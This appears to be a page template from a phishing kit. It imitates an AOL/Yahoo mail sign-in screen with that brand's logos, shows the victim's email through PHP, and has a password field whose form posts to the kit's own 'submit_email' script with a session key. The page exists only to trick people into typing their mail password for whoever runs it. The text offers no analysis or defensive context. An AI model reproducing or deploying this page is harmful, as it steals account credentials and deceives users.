...
<html id="Stencil" class="js"><head>
        ...
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="../assets/css/yahoo-grid.css">
        <!--<![endif]-->
        <style nonce="XFLCwe/DCiuSzjAd6kY+59Mj11nCDBP97Ouw7RclXeYn9Kqs">
            #mbr-css-check {
                display: inline;
            }
        </style>
    ...
    <div class="mbr-ybar ybar-light"><br>
    <div id="ybar" role="banner" class="_yb_rhopp     "> <script id="ybarConfig" type="text/x-template">{}</script>  <div class="_yb_rhab5 _yb_mzrpz"><a style="margin-left:20px;margin-top:20px;" href="#" class="_yb_9mzlp    " data-ylk="sec:yb_logo;slk:login;itc:0;">   <img class="_yb_1ut3j _yb_xu7ix" src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" width="80" height="" onerror="this.onerror=null;this.style.display='none';" alt="login"></a></div><div role="toolbar" class="_yb_1kpqt "></div></div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Yahoo" class="logo " width="116" height="">
            </div>
            <div class="challenge password-challenge ">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username"><?php echo $_SESSION['email'];?></h1>
            
    </div>
    <form action="submit_email?session=<?php echo $key;?>" method="post" class="pure-form pure-form-stacked">
        <input type="hidden" name="email" value="<?php echo $_SESSION['email'];?>">
        <input type="password" required="required" id="login-passwd" name="password" placeholder="Password" autofocus="" autocomplete="current-password">
        <p class="signin-cont">
        ...
        <p class="forgot-cont">
            <span class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link">I forgot my&nbsp;password</span>
        </p>
    </form>
</div>
...
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
    ...
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            ...
            <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"></div>
        </div>
    </div>
</div>
